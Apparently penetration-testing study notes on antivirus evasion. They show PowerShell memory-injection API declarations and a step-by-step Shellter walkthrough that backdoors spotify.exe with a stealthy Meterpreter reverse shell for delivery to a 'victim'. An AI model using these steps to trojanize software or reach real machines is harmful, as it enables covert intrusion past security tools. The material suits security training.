Antivirus Evasion

Techniques for bypassing antivirus software

Theory

    Antivirus evasion falls into two broad categories: on-disk and in-memory. There are various methods to so. Packers, Obfuscators, Crypters...

    On-disk: relies on techniques that modify an executable's structure or behavior to make malware harder to detect.

    In-memory: widely used technique to evade antivirus detection by executing malicious code directly in memory instead of writing files to disk, avoiding one of the main areas monitored by AV software. Techniques used includes Remote Process Memory Injection, Reflective DLL, Process Hollowing and Inline Hooking

    Have in mind that one of the main benefits of executing a script rather than a PE is that it is difficult for antivirus manufacturers to determine if the script is malicious as it's run inside an interpreter and the script itself isn't executable code

Remote process memory injection

    We will use a well known memory injection powershell script. The script starts by importing VirtualAlloc and CreateThread from kernel32.dll as well as memset from msvcrt.dll. These functions will allow us to allocate memory, create an execution thread, and write arbitrary data to the allocated memory, respectively. We will allocate the memory and execute a new thread in the current process (powershell.exe), rather than a remote one.

    $code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

Automating process memory injection (Using Shellter)

    To automate the process of memory injection we can use Shellter which will modify the provided PE providing us a reverse shell once executed

    Shellter relies on Wine. Since you may have trouble with Wine, remember to use the following commands otherwise it will show the following error: wine: could not load kernel32.dll, status c0000135

    echo 'export WINEARCH=win32' >> ~/.zshrc
echo 'export WINEPREFIX=~/.wine32' >> ~/.zshrc
source ~/.zshrc

winecfg

    Some times you may need to run Shellter as root

    shellter

    First select the operation mode. In our case use A which means Automatic

    Choose Operation Mode - Auto/Manual (A/M/H): A

    Now select the PE target

    PE Target: /home/kali/Downloads/spotify.exe

    Enable Stealth Mode Which responsible for restoring the execution flow of the backdoored binary and therefore avoids any unwanted suspicion. Basically it will let the binary do it's normal process

    Enable Stealth Mode? (Y/N/H): Y

    Select the payload needed. Most recommendable is Meterpreter_Reverse_TCP

    Use a listed payload or custom? (L/C/H): L 
Select payload by index: 1

    Setup IP and port for the reverse shell

    SET LHOST: 192.168.45.222                                                                                                                                                                                                                                     
SET LPORT: 4444

    Once finished transfer the binary to the target machine, start a listener with metasploit and wait for the victim to clic
